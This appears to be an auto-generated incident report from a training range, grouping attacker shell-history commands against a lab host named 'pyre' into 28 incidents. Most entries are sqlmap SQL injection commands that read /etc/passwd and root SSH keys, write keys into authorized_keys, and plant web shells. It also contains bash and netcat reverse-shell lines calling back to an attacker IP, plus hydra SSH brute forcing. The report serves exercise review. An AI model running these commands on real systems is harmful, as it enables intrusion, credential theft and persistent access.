# Pyre (10.100.7.45) Concurrent Incident Report

**Total incidents targeting Pyre**: 28

## Vulnerability Summary
- cron: 28 incidents
- git: 28 incidents
- sql: 56 incidents
- sql injection: 56 incidents

## All Incidents
### Incident 1
- Time window: 2026-01-27T19:05:00
- Target: pyre (10.100.7.45)
- Number of entries: 2
- Entries:
  - 2026-01-27T19:05:43 | logs/10.100.7.14/shell_history.csv#L320
    Command: `gobuster dir -u http://10.100.7.45 -w /usr/share/dirb/wordlists/common.txt`
  - 2026-01-27T19:05:12 | logs/10.100.7.22/shell_history.csv#L191
    Command: `nxc smb 10.100.7.45 -u guest -p "`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 2
- Time window: 2026-02-02T19:42:00
- Target: pyre (10.100.7.45)
- Number of entries: 4
- Entries:
  - 2026-02-02T19:42:00 | logs/10.100.7.32/shell_history.csv#L838
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" -T "alerts" --threads $(nproc)"`
  - 2026-02-02T19:42:18 | logs/10.100.7.32/shell_history.csv#L847
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" -T "alerts" --threads $(nproc)"`
  - 2026-02-02T19:42:26 | logs/10.100.7.32/shell_history.csv#L848
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" --tables"`
  - 2026-02-02T19:42:37 | logs/10.100.7.13/shell_history.csv#L304
    Command: `curl http://10.100.7.45/panels.php?id=5 ORDER BY 1 -- -""`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 3
- Time window: 2026-02-03T18:51:00
- Target: pyre (10.100.7.45)
- Number of entries: 2
- Entries:
  - 2026-02-03T18:51:08 | logs/10.100.7.32/shell_history.csv#L902
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --file-read=/home/pyre/ctrl.txt"`
  - 2026-02-03T18:51:43 | logs/10.100.7.12/shell_history.csv#L221
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 4
- Time window: 2026-02-03T18:56:00
- Target: pyre (10.100.7.45)
- Number of entries: 4
- Entries:
  - 2026-02-03T18:56:02 | logs/10.100.7.32/shell_history.csv#L910
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="ls ../../opt""`
  - 2026-02-03T18:56:19 | logs/10.100.7.32/shell_history.csv#L911
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="cat ./index.php""`
  - 2026-02-03T18:56:41 | logs/10.100.7.32/shell_history.csv#L912
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="cat ./alerts.php""`
  - 2026-02-03T18:56:59 | logs/10.100.7.12/shell_history.csv#L227
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --os-cmd="ls""`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 5
- Time window: 2026-02-03T19:05:00
- Target: pyre (10.100.7.45)
- Number of entries: 2
- Entries:
  - 2026-02-03T19:05:59 | logs/10.100.7.12/shell_history.csv#L230
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"`
  - 2026-02-03T19:05:17 | logs/10.100.7.31/shell_history.csv#L29
    Command: `hydra -t 4 -V -f -l pyre -P rockyou.txt.gz ssh://10.100.7.45`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 6
- Time window: 2026-02-03T19:28:00
- Target: pyre (10.100.7.45)
- Number of entries: 3
- Entries:
  - 2026-02-03T19:28:45 | logs/10.100.7.32/shell_history.csv#L938
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --os-shell"`
  - 2026-02-03T19:28:21 | logs/10.100.7.12/shell_history.csv#L249
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"`
  - 2026-02-03T19:28:25 | logs/10.100.7.12/shell_history.csv#L250
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 7
- Time window: 2026-02-02T18:48:00
- Target: pyre (10.100.7.45)
- Number of entries: 4
- Entries:
  - 2026-02-02T18:48:33 | logs/10.100.7.32/shell_history.csv#L771
    Command: `curl http://10.100.7.45/panels.php?id=%22test%22`
  - 2026-02-02T18:48:38 | logs/10.100.7.32/shell_history.csv#L772
    Command: `curl http://10.100.7.45/panels.php?id=test""`
  - 2026-02-02T18:48:43 | logs/10.100.7.32/shell_history.csv#L773
    Command: `curl http://10.100.7.45/panels.php?id=%22test%22`
  - 2026-02-02T18:48:37 | logs/10.100.7.14/shell_history.csv#L404
    Command: `nmap -sV -p 1-65535 -T3 10.100.7.45`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 8
- Time window: 2026-02-02T19:22:00
- Target: pyre (10.100.7.45)
- Number of entries: 2
- Entries:
  - 2026-02-02T19:22:58 | logs/10.100.7.32/shell_history.csv#L786
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1""`
  - 2026-02-02T19:22:08 | logs/10.100.7.13/shell_history.csv#L293
    Command: `gobuster dir -u http://10.100.7.45 -w /usr/share/wordlists/dirb/common.txt`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 9
- Time window: 2026-02-02T19:28:00
- Target: pyre (10.100.7.45)
- Number of entries: 5
- Entries:
  - 2026-02-02T19:28:40 | logs/10.100.7.32/shell_history.csv#L805
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1""`
  - 2026-02-02T19:28:21 | logs/10.100.7.14/shell_history.csv#L408
    Command: `sqlmap -u http://10.100.7.45" --dbs"`
  - 2026-02-02T19:28:45 | logs/10.100.7.13/shell_history.csv#L296
    Command: `curl http://10.100.7.45/index.php?id=1'""`
  - 2026-02-02T19:28:39 | logs/10.100.7.12/shell_history.csv#L166
    Command: `sqlmap -u 10.100.7.45/panels?id=1" --file-read=/etc/passwd"`
  - 2026-02-02T19:28:47 | logs/10.100.7.12/shell_history.csv#L167
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/etc/passwd"`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 10
- Time window: 2026-02-02T19:31:00
- Target: pyre (10.100.7.45)
- Number of entries: 7
- Entries:
  - 2026-02-02T19:31:06 | logs/10.100.7.32/shell_history.csv#L806
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1""`
  - 2026-02-02T19:31:21 | logs/10.100.7.32/shell_history.csv#L807
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --dbs"`
  - 2026-02-02T19:31:28 | logs/10.100.7.32/shell_history.csv#L808
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --dbs"`
  - 2026-02-02T19:31:36 | logs/10.100.7.32/shell_history.csv#L809
    Command: `cd ~/.local/share/sqlmap/output/10.100.7.45`
  - 2026-02-02T19:31:20 | logs/10.100.7.14/shell_history.csv#L413
    Command: `sqlmap -u http://10.100.7.45/index.php?id=1" --dbs --crawl=2 --risk=3"`
  - 2026-02-02T19:31:03 | logs/10.100.7.13/shell_history.csv#L297
    Command: `curl http://10.100.7.45/index.php?id=5""`
  - 2026-02-02T19:31:37 | logs/10.100.7.12/shell_history.csv#L170
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/root/.ssh/id_rsa --hex"`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 11
- Time window: 2026-02-02T19:34:00
- Target: pyre (10.100.7.45)
- Number of entries: 2
- Entries:
  - 2026-02-02T19:34:17 | logs/10.100.7.32/shell_history.csv#L815
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" --tables"`
  - 2026-02-02T19:34:57 | logs/10.100.7.13/shell_history.csv#L299
    Command: `curl http://10.100.7.45/panels.php?id=abc""`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 12
- Time window: 2026-02-02T19:37:00
- Target: pyre (10.100.7.45)
- Number of entries: 4
- Entries:
  - 2026-02-02T19:37:32 | logs/10.100.7.32/shell_history.csv#L820
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" -D "information_schema" -T "FILES" --dump --threads $(nproc)"`
  - 2026-02-02T19:37:35 | logs/10.100.7.32/shell_history.csv#L821
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" -D "information_schema" -T "FILES" --dump --threads $(nproc)"`
  - 2026-02-02T19:37:44 | logs/10.100.7.32/shell_history.csv#L824
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --dbs"`
  - 2026-02-02T19:37:17 | logs/10.100.7.13/shell_history.csv#L301
    Command: `curl http://10.100.7.45/panels.php?id=5 AND 1=1""`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 13
- Time window: 2026-02-02T19:38:00
- Target: pyre (10.100.7.45)
- Number of entries: 3
- Entries:
  - 2026-02-02T19:38:43 | logs/10.100.7.32/shell_history.csv#L827
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" --tables"`
  - 2026-02-02T19:38:52 | logs/10.100.7.32/shell_history.csv#L828
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" --tables --threads $(nproc)"`
  - 2026-02-02T19:38:25 | logs/10.100.7.13/shell_history.csv#L302
    Command: `curl http://10.100.7.45/panels.php?id=5%20AND%201=1""`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 14
- Time window: 2026-02-02T19:39:00
- Target: pyre (10.100.7.45)
- Number of entries: 2
- Entries:
  - 2026-02-02T19:39:07 | logs/10.100.7.32/shell_history.csv#L829
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" -T "alerts" --threads $(nproc)"`
  - 2026-02-02T19:39:53 | logs/10.100.7.12/shell_history.csv#L174
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/etc/ssh/sshd_config --threads 10"`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 15
- Time window: 2026-02-02T19:48:00
- Target: pyre (10.100.7.45)
- Number of entries: 5
- Entries:
  - 2026-02-02T19:48:36 | logs/10.100.7.32/shell_history.csv#L851
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1""`
  - 2026-02-02T19:48:13 | logs/10.100.7.13/shell_history.csv#L319
    Command: `curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%204--%20-""`
  - 2026-02-02T19:48:28 | logs/10.100.7.13/shell_history.csv#L320
    Command: `curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%208--%20-""`
  - 2026-02-02T19:48:41 | logs/10.100.7.13/shell_history.csv#L321
    Command: `curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%2010--%20-""`
  - 2026-02-02T19:48:51 | logs/10.100.7.13/shell_history.csv#L322
    Command: `curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%2030--%20-""`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 16
- Time window: 2026-02-02T19:50:00
- Target: pyre (10.100.7.45)
- Number of entries: 4
- Entries:
  - 2026-02-02T19:50:33 | logs/10.100.7.32/shell_history.csv#L858
    Command: `sqlmap -u http://10.100.7.45/alerts.php?severity=&status=""`
  - 2026-02-02T19:50:44 | logs/10.100.7.32/shell_history.csv#L859
    Command: `sqlmap -u http://10.100.7.45/alerts.php?severity=&status=""`
  - 2026-02-02T19:50:33 | logs/10.100.7.12/shell_history.csv#L200
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --file-write=./id_rsa --file-dest=/root/.ssh/id_rsa"`
  - 2026-02-02T19:50:43 | logs/10.100.7.12/shell_history.csv#L201
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --file-write=./rsa_id --file-dest=/root/.ssh/rsa_id"`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 17
- Time window: 2026-02-02T19:52:00
- Target: pyre (10.100.7.45)
- Number of entries: 5
- Entries:
  - 2026-02-02T19:52:48 | logs/10.100.7.32/shell_history.csv#L862
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --batch -D"`
  - 2026-02-02T19:52:52 | logs/10.100.7.32/shell_history.csv#L863
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --batch"`
  - 2026-02-02T19:52:59 | logs/10.100.7.32/shell_history.csv#L864
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=" --batch"`
  - 2026-02-02T19:52:02 | logs/10.100.7.13/shell_history.csv#L327
    Command: `curl http://10.100.7.45/panels.php?id=5%20AND%201=2""`
  - 2026-02-02T19:52:27 | logs/10.100.7.12/shell_history.csv#L206
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/root/.ssh/"`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 18
- Time window: 2026-02-02T19:54:00
- Target: pyre (10.100.7.45)
- Number of entries: 3
- Entries:
  - 2026-02-02T19:54:22 | logs/10.100.7.32/shell_history.csv#L870
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --users --passwords"`
  - 2026-02-02T19:54:53 | logs/10.100.7.13/shell_history.csv#L328
    Command: `curl http://10.100.7.45/panels.php?id=5%20AND%20database()%20IS%20NOT%20NULL""`
  - 2026-02-02T19:54:21 | logs/10.100.7.12/shell_history.csv#L209
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --file-write=id_rsa --file-dest=/root/.ssh/id_rsa"`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 19
- Time window: 2026-02-03T18:45:00
- Target: pyre (10.100.7.45)
- Number of entries: 5
- Entries:
  - 2026-02-03T18:45:07 | logs/10.100.7.32/shell_history.csv#L886
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --file-read=/etc/ssh/sshd_config --threads=$(nproc)"`
  - 2026-02-03T18:45:07 | logs/10.100.7.32/shell_history.csv#L887
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --file-read=/etc/ssh/sshd_config --threads=$(nproc)"`
  - 2026-02-03T18:45:07 | logs/10.100.7.32/shell_history.csv#L888
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --file-read=/etc/ssh/sshd_config --threads=$(nproc)"`
  - 2026-02-03T18:45:07 | logs/10.100.7.32/shell_history.csv#L889
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --file-read=/etc/ssh/sshd_config --threads=$(nproc)"`
  - 2026-02-03T18:45:35 | logs/10.100.7.12/shell_history.csv#L217
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --file-write="script.sh" --file-dest="/tmp/script.sh""`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 20
- Time window: 2026-02-03T18:47:00
- Target: pyre (10.100.7.45)
- Number of entries: 3
- Entries:
  - 2026-02-03T18:47:16 | logs/10.100.7.32/shell_history.csv#L893
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --file-write=/home/kali/.ssh/helios_ssh_key.pub --file-dest=/root/.ssh/authorized_keys"`
  - 2026-02-03T18:47:33 | logs/10.100.7.32/shell_history.csv#L894
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --file-write=/home/kali/.ssh/helios_ssh_key.pub --file-dest=/root/.ssh/authorized_keys"`
  - 2026-02-03T18:47:16 | logs/10.100.7.12/shell_history.csv#L219
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --file-read="/tmp/script.sh""`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 21
- Time window: 2026-02-03T18:53:00
- Target: pyre (10.100.7.45)
- Number of entries: 3
- Entries:
  - 2026-02-03T18:53:45 | logs/10.100.7.32/shell_history.csv#L905
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --file-write=./ctrl.txt --file-dest=/home/pyre/ctrl.txt"`
  - 2026-02-03T18:53:30 | logs/10.100.7.12/shell_history.csv#L222
    Command: `sqlmap -u 10.100.7.45" --os-cmd="whoami""`
  - 2026-02-03T18:53:50 | logs/10.100.7.12/shell_history.csv#L223
    Command: `sqlmap -u 10.100.7.45" -p id --os-cmd="whoami""`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 22
- Time window: 2026-02-03T18:54:00
- Target: pyre (10.100.7.45)
- Number of entries: 3
- Entries:
  - 2026-02-03T18:54:56 | logs/10.100.7.32/shell_history.csv#L906
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd=whoami"`
  - 2026-02-03T18:54:06 | logs/10.100.7.12/shell_history.csv#L224
    Command: `sqlmap -u 10.100.7.45.panels.php?id=1" --os-cmd="whoami""`
  - 2026-02-03T18:54:20 | logs/10.100.7.12/shell_history.csv#L225
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --os-cmd="whoami""`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 23
- Time window: 2026-02-03T18:55:00
- Target: pyre (10.100.7.45)
- Number of entries: 4
- Entries:
  - 2026-02-03T18:55:28 | logs/10.100.7.32/shell_history.csv#L907
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd=ls"`
  - 2026-02-03T18:55:46 | logs/10.100.7.32/shell_history.csv#L908
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="ls ../""`
  - 2026-02-03T18:55:54 | logs/10.100.7.32/shell_history.csv#L909
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="ls ../../""`
  - 2026-02-03T18:55:29 | logs/10.100.7.12/shell_history.csv#L226
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --os-cmd="sudo useradd mason""`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 24
- Time window: 2026-02-03T19:01:00
- Target: pyre (10.100.7.45)
- Number of entries: 4
- Entries:
  - 2026-02-03T19:01:09 | logs/10.100.7.32/shell_history.csv#L926
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="bash -i >& /dev/tcp/10.100.7.32/4444 0>&1""`
  - 2026-02-03T19:01:31 | logs/10.100.7.32/shell_history.csv#L927
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="nc 10.100.7.32 4444 -e /bin/bash""`
  - 2026-02-03T19:01:57 | logs/10.100.7.32/shell_history.csv#L928
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --os-cmd="sh -i >& /dev/tcp/10.100.7.32/4444 0>&1""`
  - 2026-02-03T19:01:58 | logs/10.100.7.12/shell_history.csv#L228
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 25
- Time window: 2026-02-03T19:12:00
- Target: pyre (10.100.7.45)
- Number of entries: 3
- Entries:
  - 2026-02-03T19:12:44 | logs/10.100.7.32/shell_history.csv#L934
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --os-shell"`
  - 2026-02-03T19:12:03 | logs/10.100.7.12/shell_history.csv#L233
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --file-read="/ctrl.txt""`
  - 2026-02-03T19:12:50 | logs/10.100.7.12/shell_history.csv#L234
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --file-read="home/pyre/ctrl.txt""`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 26
- Time window: 2026-02-03T19:31:00
- Target: pyre (10.100.7.45)
- Number of entries: 4
- Entries:
  - 2026-02-03T19:31:12 | logs/10.100.7.32/shell_history.csv#L952
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --write-file=./php-reverse-shell.php --dest-file=/var/www/html/rev-shell.php"`
  - 2026-02-03T19:31:47 | logs/10.100.7.32/shell_history.csv#L953
    Command: `sqlmap -u http://10.100.7.45/panels.php?id=1" --file-write=./php-reverse-shell.php --file-dest=/var/www/html/rev-shell.php"`
  - 2026-02-03T19:31:54 | logs/10.100.7.12/shell_history.csv#L253
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"`
  - 2026-02-03T19:31:20 | logs/10.100.7.31/shell_history.csv#L79
    Command: `gobuster dir -u http://10.100.7.45 -w directory-list-2.3-medium.txt`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 27
- Time window: 2026-02-03T19:43:00
- Target: pyre (10.100.7.45)
- Number of entries: 4
- Entries:
  - 2026-02-03T19:43:04 | logs/10.100.7.32/shell_history.csv#L960
    Command: `ssh pyre@10.100.7.45`
  - 2026-02-03T19:43:37 | logs/10.100.7.32/shell_history.csv#L961
    Command: `ssh pyre@10.100.7.45`
  - 2026-02-03T19:43:57 | logs/10.100.7.32/shell_history.csv#L962
    Command: `ssh pyre@10.100.7.45`
  - 2026-02-03T19:43:27 | logs/10.100.7.12/shell_history.csv#L267
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

### Incident 28
- Time window: 2026-02-03T19:44:00
- Target: pyre (10.100.7.45)
- Number of entries: 5
- Entries:
  - 2026-02-03T19:44:14 | logs/10.100.7.32/shell_history.csv#L963
    Command: `ssh root@10.100.7.45`
  - 2026-02-03T19:44:00 | logs/10.100.7.12/shell_history.csv#L269
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --file-write="shell.py" --file-dest="/var/www/html/shell.py""`
  - 2026-02-03T19:44:16 | logs/10.100.7.12/shell_history.csv#L270
    Command: `sqlmap -u 10.100.7.45/panels.php" --file-write="shell.py" --file-dest="/var/www/html/shell.py""`
  - 2026-02-03T19:44:27 | logs/10.100.7.12/shell_history.csv#L271
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --file-write="shell.py" --file-dest="/var/www/html/shell.py""`
  - 2026-02-03T19:44:53 | logs/10.100.7.12/shell_history.csv#L272
    Command: `sqlmap -u 10.100.7.45/panels.php?id=1" --os-shell"`
- Matched vulnerability documentation:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

